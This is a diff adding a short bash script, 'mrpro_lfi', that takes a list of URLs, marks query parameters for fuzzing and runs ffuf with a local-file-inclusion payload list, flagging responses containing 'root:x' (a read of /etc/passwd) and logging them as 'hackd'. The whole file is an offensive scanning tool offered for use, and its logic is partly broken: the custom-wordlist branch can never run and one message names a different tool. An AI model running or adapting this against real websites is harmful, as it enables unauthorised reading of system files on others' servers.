@@ -1,0 +1,28 @@
+#!/bin/bash
+
+while getopts f:w: flag
+do
+    case "${flag}" in
+        f) filename=${OPTARG};;
+        w) wordlist=${OPTARG};;
+    esac
+done
+
+if [[ $# == 0 ]]; then
+    echo "mrpro_lfi -f {file_name} -w {wordlist}"
+elif [[ ! $filename == "" ]]; then
+    if [ -f "$filename" ]; then
+                cat $filename |qsreplase FUZZ | grep FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w /var/payloads/mylfipayload | grep 200 && echo hackd $url >> hackd_lfi ; done
+        else
+            echo "$filename does not exist."
+        fi
+elif [[ ! $filename == "" && ! $wordlist == "" ]]; then
+        if [ -f "$filename" ]; then
+                        cat $filename |qsreplase FUZZ | grep FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w $wordlist | grep 200 && echo hackd $url >> hackd_lfi ; done
+                else
+            echo "$filename does not exist."
+                        echo "mrpro_sqli -f {file_name} -t {threads}"
+        fi
+else
+    echo "mrpro_lfi -f {file_name} -w {wordlist}"
+fi
